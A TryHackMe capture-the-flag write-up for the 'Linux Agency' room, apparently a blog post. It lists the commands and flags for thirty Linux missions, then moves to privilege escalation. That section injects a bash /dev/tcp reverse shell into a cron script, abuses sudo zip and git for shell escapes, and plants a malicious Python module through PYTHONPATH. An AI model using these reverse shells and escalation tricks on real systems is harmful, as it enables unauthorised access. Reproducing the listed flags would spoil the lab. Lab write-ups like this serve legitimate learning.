---
title: "TryHackMe - Linux Agency"
categories:
  - TryHackMe
tags:
  - writeup
  - tryhackme
  - linux
---
This Room will help you to sharpen your Linux Skills and help you to learn basic privilege escalation in a HITMAN theme. So, pack your briefcase and grab your SilverBallers as its gonna be a tough ride.

## Linux Fundamentals
- What is the mission1 flag?

    ```bash
    agent47@linuxagency:~$ find . -type f -exec cat {} \; | grep "mission1"
    echo "mission1{174dc8f191bcbb161fe25f8a5b58d1f0}"
    ```

- What is the mission2 flag?

    ```bash
    mission1@linuxagency:~$ ls
    mission2{8a1b68bb11e4a35245061656b5b9fa0d}
    ```

- What is the mission3 flag?

    ```bash
    mission2@linuxagency:~$ ls
    flag.txt
    mission2@linuxagency:~$ cat flag.txt 
    mission3{ab1e1ae5cba688340825103f70b0f976}
    ```

- What is the mission4 flag?

    ```bash
    mission3@linuxagency:~$ ls -la
    total 32
    drwxr-x---  3 mission3 mission3 4096 Jan 29 02:57 .
    drwxr-xr-x 45 root     root     4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission3 mission3    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission3 mission3 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission3 mission3  101 Jan 12 04:02 flag.txt
    -rw-rw-r--  1 mission3 mission3  101 Jan 29 02:57 hehe
    -rw-------  1 mission3 mission3   34 Jan 12 04:02 .lesshst
    drwxr-xr-x  3 mission3 mission3 4096 Jan 12 04:02 .local
    -rw-r--r--  1 mission3 mission3  807 Jan 12 04:02 .profile
    mission3@linuxagency:~$ cat flag.txt 
    I am really sorry man the flag is stolen by some thief's.
    mission3@linuxagency:~$ cat .lesshst 
    .less-history-file:
    .shell
    "q
    "wq
    mission3@linuxagency:~$ less flag.txt
    mission4{264a7eeb920f80b3ee9665fafb7ff92d}
    ```

- What is the mission5 flag?

    ```bash
    mission4@linuxagency:~$ ls -la
    total 20
    drwxr-x---  3 mission4 mission4 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root     root     4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission4 mission4    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission4 mission4 3771 Jan 12 04:02 .bashrc
    drwxr-xr-x  2 mission4 mission4 4096 Jan 12 04:02 flag
    -rw-r--r--  1 mission4 mission4  807 Jan 12 04:02 .profile
    mission4@linuxagency:~$ cat flag/flag.txt 
    .bash_history  .bashrc        flag/          .profile       
    mission4@linuxagency:~$ cat flag/flag.txt 
    mission5{bc67906710c3a376bcc7bd25978f62c0}
    ```

- What is the mission6 flag?

    ```bash
    mission5@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission5 mission5 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root     root     4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission5 mission5    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission5 mission5 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission5 mission5   43 Jan 12 04:02 .flag.txt
    -rw-r--r--  1 mission5 mission5  807 Jan 12 04:02 .profile
    mission5@linuxagency:~$ cat .flag.txt 
    mission6{1fa67e1adc244b5c6ea711f0c9675fde}
    ```

- What is the mission7 flag?

    ```bash
    mission6@linuxagency:~$ ls -la
    total 20
    drwxr-x---  3 mission6 mission6 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root     root     4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission6 mission6    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission6 mission6 3771 Jan 12 04:02 .bashrc
    drwxr-xr-x  2 mission6 mission6 4096 Jan 12 04:02 .flag
    -rw-r--r--  1 mission6 mission6  807 Jan 12 04:02 .profile
    mission6@linuxagency:~$ cat .flag/flag.txt 
    mission7{53fd6b2bad6e85519c7403267225def5}
    ```

- What is the mission8 flag?

    ```bash
    bash: /home/mission6/.bashrc: Permission denied
    mission7@linuxagency:~$ ls -la
    ls: cannot open directory '.': Permission denied
    mission7@linuxagency:~$ ls
    ls: cannot open directory '.': Permission denied
    mission7@linuxagency:~$ cd ..
    mission7@linuxagency:/home$ ls
    0z09e    jordan    mission10  mission14  mission18  mission21  mission25  mission29  mission5  mission9  silvio
    agent47  ken       mission11  mission15  mission19  mission22  mission26  mission3   mission6  penelope  viktor
    dalia    maya      mission12  mission16  mission2   mission23  mission27  mission30  mission7  reza      xyan1d3
    diana    mission1  mission13  mission17  mission20  mission24  mission28  mission4   mission8  sean
    mission7@linuxagency:/home$ cd mission7
    mission7@linuxagency:/home/mission7$ ls
    flag.txt
    mission7@linuxagency:/home/mission7$ cat flag.txt 
    mission8{3bee25ebda7fe7dc0a9d2f481d10577b}
    ```

- What is the mission9 flag?

    ```bash
    mission8@linuxagency:~$ find / -type f -user mission8 2>/dev/null
    ...
    /home/mission8/.profile
    /home/mission8/.bashrc
    /flag.txt
    mission8@linuxagency:~$ cat /flag.txt 
    mission9{ba1069363d182e1c114bef7521c898f5}
    ```

- What is the mission10 flag?

    ```bash
    mission9@linuxagency:~$ cat rockyou.txt | grep "mission10"
    mission101
    mission10
    mission10{0c9d1c7c5683a1a29b05bb67856524b6}
    mission1098
    mission108
    ```

- What is the mission11 flag?

    ```bash
    mission10@linuxagency:~$ find . -type f -exec cat {} \; | grep "mission11"
    mission11{db074d9b68f06246944b991d433180c0}
    ```

- What is the mission12 flag?

    ```bash
    mission11@linuxagency:/$ cat /home/mission11/.bashrc | grep "flag"
    export flag=$(echo fTAyN2E5Zjc2OTUzNjQ1MzcyM2NkZTZkMzNkMWE5NDRmezIxbm9pc3NpbQo= |base64 -d|rev)
    mission11@linuxagency:/$ echo $flag
    mission12{f449a1d33d6edc327354635967f9a720}
    ```

- What is the mission13 flag?

    ```bash
    mission12@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission12 mission12 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission12 mission12    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission12 mission12 3771 Jan 12 04:02 .bashrc
    ----------  1 mission12 mission12   44 Jan 12 04:02 flag.txt
    -rw-r--r--  1 mission12 mission12  807 Jan 12 04:02 .profile
    mission12@linuxagency:~$ chmod +r flag.txt 
    mission12@linuxagency:~$ cat flag.txt 
    mission13{076124e360406b4c98ecefddd13ddb1f}
    ```

- What is the mission14 flag?

    ```bash
    mission13@linuxagency:~$ ls -la
    total 28
    drwxr-x---  3 mission13 mission13 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission13 mission13    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission13 mission13 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission13 mission13   61 Jan 12 04:02 flag.txt
    drwxr-xr-x  3 mission13 mission13 4096 Jan 12 04:02 .local
    -rw-r--r--  1 mission13 mission13  807 Jan 12 04:02 .profile
    -rw-------  1 mission13 mission13  978 Jan 12 04:02 .viminfo
    mission13@linuxagency:~$ cat flag.txt 
    bWlzc2lvbjE0e2Q1OThkZTk1NjM5NTE0Yjk5NDE1MDc2MTdiOWU1NGQyfQo=
    mission13@linuxagency:~$ cat flag.txt | base64 -d
    mission14{d598de95639514b9941507617b9e54d2}
    ```

- What is the mission15 flag?

    ```bash
    mission14@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission14 mission14 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission14 mission14    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission14 mission14 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission14 mission14  345 Jan 12 04:02 flag.txt
    -rw-r--r--  1 mission14 mission14  807 Jan 12 04:02 .profile
    mission14@linuxagency:~$ cat flag.txt 
    01101101011010010111001101110011011010010110111101101110001100010011010101111011011001100110001100110100001110010011000100110101011001000011100000110001001110000110001001100110011000010110010101100110011001100011000000110001001100010011100000110101011000110011001100110101001101000011011101100110001100100011010100110101001110010011011001111101
    mission14@linuxagency:~$ cat flag.txt | perl -lpe '$_=pack"B*",$_'
    mission15{fc4915d818bfaeff01185c3547f25596}
    ```

- What is the mission16 flag?

    ```bash
    mission15@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission15 mission15 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission15 mission15    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission15 mission15 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission15 mission15   87 Jan 12 04:02 flag.txt
    -rw-r--r--  1 mission15 mission15  807 Jan 12 04:02 .profile
    mission15@linuxagency:~$ cat flag.txt 
    6D697373696F6E31367B38383434313764343030333363346332303931623434643763323661393038657D
    mission15@linuxagency:~$ cat flag.txt | xxd -r -p
    mission16{884417d40033c4c2091b44d7c26a908e}
    ```

- What is the mission17 flag?

    ```bash
    mission16@linuxagency:~$ ls -la
    total 28
    drwxr-x---  2 mission16 mission16 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission16 mission16    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission16 mission16 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission16 mission16 8440 Jan 12 04:02 flag
    -rw-r--r--  1 mission16 mission16  807 Jan 12 04:02 .profile
    mission16@linuxagency:~$ file flag 
    flag: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1606102f7b80d832eabee1087180ea7ce24a96ca, not stripped
    mission16@linuxagency:~$ chmod +x flag 
    mission16@linuxagency:~$ ./flag 


    mission17{49f8d1348a1053e221dfe7ff99f5cbf4}
    ```

- What is the mission18 flag?

    ```bash
    mission17@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission17 mission17 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission17 mission17    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission17 mission17 3771 Jan 12 04:02 .bashrc
    -rwxr-xr-x  1 mission17 mission17  475 Jan 12 04:02 flag.java
    -rw-r--r--  1 mission17 mission17  807 Jan 12 04:02 .profile
    mission17@linuxagency:~$ cat flag.java 
    import java.util.*;
    public class flag
    {
        public static void main(String[] args)
        {
            String outputString="";
            String encrypted_flag="`d~~dbc<5vk=4:;=;9445;o954nil>?=lo8k:4<:h5p";
            int length = encrypted_flag.length();
            for (int i = 0 ; i < length ; i++)
            {
                outputString = outputString + Character.toString((char) (encrypted_flag.charAt(i) ^ 13)); 
            }
            System.out.println(outputString);
        }
    }
    mission17@linuxagency:~$ javac flag.java 
    mission17@linuxagency:~$ java flag 
    mission18{f09760649986b489cda320ab5f7917e8}
    ```

- What is the mission19 flag?

    ```bash
    mission18@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission18 mission18 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission18 mission18    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission18 mission18 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission18 mission18  312 Jan 12 04:02 flag.rb
    -rw-r--r--  1 mission18 mission18  807 Jan 12 04:02 .profile
    mission18@linuxagency:~$ ruby flag.rb 
    mission19{a0bf41f56b3ac622d808f7a4385254b7}
    ```

- What is the mission20 flag?

    ```bash
    mission19@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission19 mission19 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission19 mission19    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission19 mission19 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission19 mission19  276 Jan 12 04:02 flag.c
    -rw-r--r--  1 mission19 mission19  807 Jan 12 04:02 .profile
    mission19@linuxagency:~$ gcc flag.c 
    flag.c: In function ‘main’:
    flag.c:5:18: warning: implicit declaration of function ‘strlen’ [-Wimplicit-function-declaration]
        int length = strlen(flag);
                    ^~~~~~
    flag.c:5:18: warning: incompatible implicit declaration of built-in function ‘strlen’
    flag.c:5:18: note: include ‘<string.h>’ or provide a declaration of ‘strlen’
    mission19@linuxagency:~$ ls
    a.out  flag.c
    mission19@linuxagency:~$ ./a.out 
    mission20{b0482f9e90c8ad2421bf4353cd8eae1c}
    ```

- What is the mission21 flag?

    ```bash
    mission20@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission20 mission20 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission20 mission20    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission20 mission20 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission20 mission20  186 Jan 12 04:02 flag.py
    -rw-r--r--  1 mission20 mission20  807 Jan 12 04:02 .profile
    mission20@linuxagency:~$ python flag.py 

    Command 'python' not found, but can be installed with:

    apt install python3       
    apt install python        
    apt install python-minimal

    Ask your administrator to install one of them.

    You also have python3 installed, you can run 'python3' instead.

    mission20@linuxagency:~$ python3 flag.py 
    mission21{7de756aabc528b446f6eb38419318f0c}
    ```

- What is the mission22 flag?

```bash
mission20@linuxagency:~$ su mission21
Password: 
$ ls
ls: cannot open directory '.': Permission denied
$ bash -i
mission22{24caa74eb0889ed6a2e6984b42d49aaf}
```

- What is the mission23 flag?

    ```bash
    >> import pty; pty.spawn("/bin/bash")
    mission22@linuxagency:~$ ls -la
    total 24
    drwxr-x---  2 mission22 mission22 4096 Jan 29 04:43 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission22 mission22    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission22 mission22 3771 Jan 12 04:02 .bashrc
    -r--------  1 mission22 mission22   44 Jan 12 04:02 flag.txt
    -rw-r--r--  1 mission22 mission22  807 Jan 12 04:02 .profile
    -rw-------  1 mission22 mission22  155 Jan 29 04:43 .python_history
    mission22@linuxagency:~$ cat flag.txt 
    mission23{3710b9cb185282e3f61d2fd8b1b4ffea}
    ```

- What is the mission24 flag?

    ```bash
    mission23@linuxagency:~$ ls -la
    total 24
    drwxr-x---  3 mission23 mission23 4096 Jan 15 07:36 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission23 mission23    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission23 mission23 3771 Jan 12 04:02 .bashrc
    drwxrwxr-x  3 mission23 mission23 4096 Jan 12 06:39 .local
    -r--------  1 mission23 mission23   69 Jan 15 07:36 message.txt
    -rw-r--r--  1 mission23 mission23  807 Jan 12 04:02 .profile
    mission23@linuxagency:~$ cat message.txt 
    The hosts will help you.
    [OPTIONAL] Maybe you will need curly hairs.
    mission23@linuxagency:~$ cat /etc/hosts
    127.0.0.1       localhost       linuxagency     mission24.com
    127.0.1.1       ubuntu  linuxagency

    # The following lines are desirable for IPv6 capable hosts
    ::1     ip6-localhost ip6-loopback      linuxagency
    fe00::0 ip6-localnet
    ff00::0 ip6-mcastprefix
    ff02::1 ip6-allnodes
    ff02::2 ip6-allrouters
    mission23@linuxagency:~$ curl linuxagency | grep "mission"
    % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                    Dload  Upload   Total   Spent    Left  Speed
    0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0    <title>mission24{dbaeb06591a7fd6230407df3a947b89c}</title>
    100 10924  100 10924    0     0   761k      0 --:--:-- --:--:-- --:--:--  711k
    ```

- What is the mission25 flag?

    ```bash
    mission24@linuxagency:~$ ls -la
    total 40
    drwxr-x---  3 mission24 mission24 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission24 mission24    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission24 mission24 3771 Jan 12 04:02 .bashrc
    -rwxr-xr-x  1 mission24 mission24 8576 Jan 12 04:02 bribe
    drwxr-xr-x  3 mission24 mission24 4096 Jan 12 04:02 .local
    -rw-r--r--  1 mission24 mission24  807 Jan 12 04:02 .profile
    -rw-------  1 mission24 mission24 5092 Jan 12 04:02 .viminfo
    mission24@linuxagency:~$ cat .viminfo | grep "mission"
                    printf("mission25{61b93637881c87c71f220033b22a921b}\n");
    |3,0,4,1,1,0,1610305123,"       printf(\"mission25{61b93637881c87c71f220033b22a921b}\\n\");"
    ```

- What is the mission26 flag?

    ```bash
    mission25@linuxagency:/home$ ls
    bash: ls: No such file or directory
    mission25@linuxagency:/home$ echo $PATH

    mission25@linuxagency:/home$ cd ~
    mission25@linuxagency:~$ /bin/ls
    flag.txt
    mission25@linuxagency:~$ /bin/cat flag.txt
    mission26{cb6ce977c16c57f509e9f8462a120f00}
    ```

- What is the mission27 flag?

    ```bash
    mission26@linuxagency:~$ ls -la
    total 104
    drwxr-x---  3 mission26 mission26  4096 Jan 29 04:54 .
    drwxr-xr-x 45 root      root       4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission26 mission26     9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission26 mission26  3771 Jan 12 04:02 .bashrc
    -r--------  1 mission26 mission26 85980 Jan 12 04:02 flag.jpg
    -rw-r--r--  1 mission26 mission26   807 Jan 12 04:02 .profile
    drwx------  2 mission26 mission26  4096 Jan 29 04:54 .ssh
    mission26@linuxagency:~$ strings flag.jpg | grep "mission"
    -mission27{444d29b932124a48e7dddc0595788f4d}
    ```

- What is the mission28 flag?

    ```bash
    mission27@linuxagency:~$ ls -la
    total 20
    drwxr-x---  2 mission27 mission27 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission27 mission27    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission27 mission27 3771 Jan 12 04:02 .bashrc
    -rw-r--r--  1 mission27 mission27  136 Jan 12 04:02 flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz
    -rw-r--r--  1 mission27 mission27  807 Jan 12 04:02 .profile
    mission27@linuxagency:~$ gzip -d flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png.gz 
    mission27@linuxagency:~$ ls
    flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png
    mission27@linuxagency:~$ cat flag.mp3.mp4.exe.elf.tar.php.ipynb.py.rb.html.css.zip.gz.jpg.png 
    GIF87a
    mission28{03556f8ca983ef4dc26d2055aef9770f}
    ```

- What is the mission29 flag?

    ```bash
    mission27@linuxagency:~$ su mission28
    Password: 
    irb(main):001:0> exec "/bin/bash"
    mission28@linuxagency:/home/mission27$ cd ~
    mission28@linuxagency:~$ ls -la
    total 40
    drwxr-x---  3 mission28 mission28 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission28 mission28    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission28 mission28  220 Jan 12 04:02 .bash_logout
    -rw-r--r--  1 mission28 mission28 3771 Jan 12 04:02 .bashrc
    -rw-r--r--  1 mission28 mission28 8980 Jan 12 04:02 examples.desktop
    drwxr-xr-x  3 mission28 mission28 4096 Jan 12 04:02 .local
    -rw-r--r--  1 mission28 mission28  807 Jan 12 04:02 .profile
    -r--------  1 mission28 mission28   44 Jan 12 04:02 txt.galf
    mission28@linuxagency:~$ ccat txt.galf 

    Command 'ccat' not found, but can be installed with:

    apt install ccrypt
    Please ask your administrator.

    mission28@linuxagency:~$ cat txt.galf 
    }1fff2ad47eb52e68523621b8d50b2918{92noissim
    mission28@linuxagency:~$ rev txt.galf 
    mission29{8192b05d8b12632586e25be74da2fff1}mission27@linuxagency:~$ su mission28
    Password: 
    irb(main):001:0> exec "/bin/bash"
    mission28@linuxagency:/home/mission27$ cd ~
    mission28@linuxagency:~$ ls -la
    total 40
    drwxr-x---  3 mission28 mission28 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission28 mission28    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission28 mission28  220 Jan 12 04:02 .bash_logout
    -rw-r--r--  1 mission28 mission28 3771 Jan 12 04:02 .bashrc
    -rw-r--r--  1 mission28 mission28 8980 Jan 12 04:02 examples.desktop
    drwxr-xr-x  3 mission28 mission28 4096 Jan 12 04:02 .local
    -rw-r--r--  1 mission28 mission28  807 Jan 12 04:02 .profile
    -r--------  1 mission28 mission28   44 Jan 12 04:02 txt.galf
    mission28@linuxagency:~$ cat txt.galf 
    }1fff2ad47eb52e68523621b8d50b2918{92noissim
    mission28@linuxagency:~$ rev txt.galf 
    mission29{8192b05d8b12632586e25be74da2fff1}
    ```

- What is the mission30 flag?

    ```bash
    mission29@linuxagency:~/bludit$ ls -la
    total 44
    drwxr-xr-x  7 mission29 mission29 4096 Jan 12 04:02 .
    drwxr-x---  3 mission29 mission29 4096 Jan 12 04:02 ..
    drwxr-xr-x  2 mission29 mission29 4096 Jan 12 04:02 bl-content
    drwxr-xr-x 10 mission29 mission29 4096 Jan 12 04:02 bl-kernel
    drwxr-xr-x  2 mission29 mission29 4096 Jan 12 04:02 bl-languages
    drwxr-xr-x 27 mission29 mission29 4096 Jan 12 04:02 bl-plugins
    drwxr-xr-x  4 mission29 mission29 4096 Jan 12 04:02 bl-themes
    -rw-r--r--  1 mission29 mission29  394 Jan 12 04:02 .htaccess
    -rw-r--r--  1 mission29 mission29   44 Jan 12 04:02 .htpasswd
    -rw-r--r--  1 mission29 mission29  900 Jan 12 04:02 index.php
    -rw-r--r--  1 mission29 mission29 1083 Jan 12 04:02 LICENSE
    mission29@linuxagency:~/bludit$ cat .htaccess 
    AddDefaultCharset UTF-8

    <IfModule mod_rewrite.c>

    # Enable rewrite rules
    RewriteEngine on

    # Base directory
    #RewriteBase /

    # Deny direct access to the next directories
    RewriteRule ^bl-content/(databases|workspaces|pages|tmp)/.*$ - [R=404,L]

    # All URL process by index.php
    RewriteCond %{REQUEST_FILENAME} !-f
    RewriteCond %{REQUEST_FILENAME} !-d
    RewriteRule ^(.*) index.php [PT,L]

    </IfModule>mission29@linuxagency:~/bludit$ cat .htpasswd 
    mission30{d25b4c9fac38411d2fcb4796171bda6e}
    ```

- What is viktor's Flag?

    ```bash
    mission30@linuxagency:~$ ls -la
    total 36
    drwxr-x---  3 mission30 mission30 4096 Jan 12 04:02 .
    drwxr-xr-x 45 root      root      4096 Jan 12 04:02 ..
    lrwxrwxrwx  1 mission30 mission30    9 Jan 12 04:02 .bash_history -> /dev/null
    -rw-r--r--  1 mission30 mission30  220 Jan 12 04:02 .bash_logout
    -rw-r--r--  1 mission30 mission30 3771 Jan 12 04:02 .bashrc
    drwxr-xr-x  3 mission30 mission30 4096 Jan 12 04:02 Escalator
    -rw-r--r--  1 mission30 mission30 8980 Jan 12 04:02 examples.desktop
    -rw-r--r--  1 mission30 mission30  807 Jan 12 04:02 .profile
    mission30@linuxagency:~$ cd Escalator/
    mission30@linuxagency:~/Escalator$ ls
    sources.py
    mission30@linuxagency:~/Escalator$ cat sources.py 
    print("Hey I have learn't python")
    mission30@linuxagency:~/Escalator$ python3 sources.py 
    Hey I have learn't python
    mission30@linuxagency:~/Escalator$ ls -la
    total 16
    drwxr-xr-x 3 mission30 mission30 4096 Jan 12 04:02 .
    drwxr-x--- 3 mission30 mission30 4096 Jan 12 04:02 ..
    drwxr-xr-x 8 mission30 mission30 4096 Jan 12 04:02 .git
    -rw-r--r-- 1 mission30 mission30   35 Jan 12 04:02 sources.py
    mission30@linuxagency:~/Escalator$ git log
    commit 24cbf44a9cb0e65883b3f76ef5533a2b2ef96497 (HEAD -> master, origin/master)
    Author: root <root@Xyan1d3>
    Date:   Mon Jan 11 15:37:56 2021 +0530

        My 1st python Script

    commit e0b807dbeb5aba190d6307f072abb60b34425d44
    Author: root <root@Xyan1d3>
    Date:   Mon Jan 11 15:36:40 2021 +0530

        Your flag is viktor{b52c60124c0f8f85fe647021122b3d9a}
    ```

## Privilege Escalation
- What is dalia's flag?

    ```bash
    viktor@linuxagency:~$ find / -type f,d -user viktor 2>/dev/null
    ...
    /home/viktor
    /home/viktor/.local
    /home/viktor/.local/share
    /home/viktor/.local/share/nano
    /home/viktor/.profile
    /home/viktor/.cache
    /home/viktor/.cache/motd.legal-displayed
    /home/viktor/.bashrc
    /home/viktor/examples.desktop
    /home/viktor/.gnupg
    /home/viktor/.gnupg/private-keys-v1.d
    /home/viktor/.bash_logout
    /opt/scripts/47.sh
    viktor@linuxagency:/opt/scripts$ cat /etc/crontab 
    # /etc/crontab: system-wide crontab
    # Unlike any other crontab you don't have to run the `crontab'
    # command to install the new version when you edit this file
    # and files in /etc/cron.d. These files also have username fields,
    # that none of the other crontabs do.

    SHELL=/bin/sh
    PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

    # m h dom mon dow user  command
    17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
    25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
    47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
    52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
    *  *    * * *   dalia   sleep 30;/opt/scripts/47.sh
    *  *    * * *   root    echo "IyEvYmluL2Jhc2gKI2VjaG8gIkhlbGxvIDQ3IgpybSAtcmYgL2Rldi9zaG0vCiNlY2hvICJIZXJlIHRpbWUgaXMgYSBncmVhdCBtYXR0ZXIgb2YgZXNzZW5jZSIKcm0gLXJmIC90bXAvCg==" | base64 -d > /opt/scripts/47.sh;chown viktor:viktor /opt/scripts/47.sh;chmod +x /opt/scripts/47.sh;

    ## Inject our reverse shell
    viktor@linuxagency:/opt/scripts$ echo "bash -c 'exec bash -i &>/dev/tcp/10.11.25.205/9999 <&1'" > 47.sh

    ## Set up our netcat shell and wait
    nc -lnvp 9999
    listening on [any] 9999 ...
    connect to [10.11.25.205] from (UNKNOWN) [10.10.123.13] 53222
    bash: cannot set terminal process group (25150): Inappropriate ioctl for device
    bash: no job control in this shell
    dalia@linuxagency:~$ 
    ls
    examples.desktop  flag.txt
    dalia@linuxagency:~$ cat fl
    cat flag.txt 
    dalia{4a94a7a7bb4a819a63a33979926c77dc}
    ```

- What is silvio's flag?

    ```bash
    dalia@linuxagency:~$ sudo -l
    sudo -l
    Matching Defaults entries for dalia on localhost:
        env_reset, env_file=/etc/sudoenv, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User dalia may run the following commands on localhost:
        (silvio) NOPASSWD: /usr/bin/zip
    dalia@linuxagency:~$ TF=$(mktemp -u)
    TF=$(mktemp -u)
    dalia@linuxagency:~$ sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
    sudo -u silvio zip $TF /etc/hosts -T -TT 'sh #'
    adding: etc/hosts (deflated 37%)
    $ whoami
    whoami
    silvio
    silvio@linuxagency:~$ 
    ls
    examples.desktop  flag.txt
    silvio@linuxagency:~$ cat flag
    cat flag.txt 
    silvio{657b4d058c03ab9988875bc937f9c2ef}
    ```

- What is reza's flag?

    ```bash
    silvio@linuxagency:~$ sudo -l
    sudo -l
    Matching Defaults entries for silvio on localhost:
        env_reset, env_file=/etc/sudoenv, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User silvio may run the following commands on localhost:
        (reza) SETENV: NOPASSWD: /usr/bin/git
    silvio@linuxagency:~$ sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
    sudo -u reza PAGER='sh -c "exec sh 0<&1"' git -p help
    $ bash -i
    bash -i
    bash: /home/silvio/.bashrc: Permission denied
    reza@linuxagency:~$ 
    ls
    examples.desktop  flag.txt
    reza@linuxagency:~$ cat fl
    cat flag.txt 
    reza{2f1901644eda75306f3142d837b80d3e}
    ```

- What is jordan's flag?

    ```bash
    reza@linuxagency:~$ sudo -l
    sudo -l
    Matching Defaults entries for reza on localhost:
        env_reset, env_file=/etc/sudoenv, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User reza may run the following commands on localhost:
        (jordan) SETENV: NOPASSWD: /opt/scripts/Gun-Shop.py




    ## Upload our reverse shell, because we can exploit the python path (source: https://atsika.info/htb-admirer/)
    ## 1. Run the /opt/scripts/Gun-Shop.py first
    ## 2. We got error, no library named `shop` and we need `buy` method
    ## 3. Create our own library
    ## Here is the arbitrary library:
    import os 

    def buy(a): 
        os.system("bash -c 'exec bash -i &>/dev/tcp/10.11.25.205/9998 <&1'")

    ## `wget` the script and run the exploit
    reza@linuxagency:/tmp/shop$ sudo -u jordan PYTHONPATH=/tmp/shop /opt/scripts/Gun-Shop.py

    ## Set up `netcat` listener and wait
